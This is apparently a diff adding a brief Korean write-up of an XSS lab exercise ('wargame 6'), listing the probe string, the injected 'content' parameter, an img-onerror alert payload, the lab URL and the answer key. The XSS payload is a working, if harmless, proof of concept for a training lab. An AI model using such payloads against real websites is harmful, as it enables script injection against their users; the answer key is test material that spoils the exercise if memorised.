@@ -1,0 +1,24 @@
+============================
+XSS 워게임 6번
+============================
+
+1. 삽입한 주소
+
+eqsttest(1,2,3,4...)<>()"'
+
+2. 삽입한 파라미터 
+
+content
+
+3. 공격구문
+
+qwer<img src=abcd onerror='alert("xss");' style="display:none;'>
+
+4. 조회한 URL 
+https://lab.eqst.co.kr:8083/exam20/faqview.php?board_id=37309
+
+5. 정답
+
+html..xss
+
+==============================
